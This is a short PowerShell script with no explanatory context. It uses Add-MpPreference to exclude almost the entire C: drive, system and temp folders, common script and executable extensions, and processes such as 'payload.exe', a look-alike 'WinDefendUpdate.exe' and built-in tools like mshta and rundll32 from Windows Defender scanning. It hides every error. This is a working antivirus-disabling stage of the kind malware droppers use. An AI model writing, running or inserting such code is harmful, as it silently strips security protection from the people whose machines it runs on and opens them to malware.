try {
    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
        $Paths = @(
            [System.Environment]::GetFolderPath("ProgramFiles"),
            [System.Environment]::GetFolderPath("ProgramFilesX86"),
            [System.Environment]::GetFolderPath("ApplicationData"),
            [System.Environment]::GetFolderPath("LocalApplicationData"),
            [System.IO.Path]::GetTempPath(),
            "C:\",
            "C:\Windows\Temp",
            "C:\ProgramData",
            "C:\Users",
            "C:\Windows\System32",
            "C:\Windows\SysWOW64"
        )

        $Processes = @(
            "payload.exe",
            "Main.exe",
            "RuntimeBroker.exe",
            "SvcHost.exe",
            "WinDefendUpdate.exe",
            "powershell.exe",
            "powershell_ise.exe",
            "cmd.exe",
            "wscript.exe",
            "cscript.exe",
            "mshta.exe",
            "rundll32.exe",
            "regsvr32.exe",
            "wmic.exe"
        )

        $Extensions = @(
            ".exe", ".dll", ".bat", ".cmd", ".ps1",
            ".vbs", ".js", ".hta", ".bin", ".zip", ".tmp"
        )

        foreach ($Path in $Paths) {
            if (Test-Path $Path) {
                Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue
            }
        }

        foreach ($Process in $Processes) {
            Add-MpPreference -ExclusionProcess $Process -ErrorAction SilentlyContinue
        }

        foreach ($Ext in $Extensions) {
            Add-MpPreference -ExclusionExtension $Ext -ErrorAction SilentlyContinue
        }
    }
}
catch {}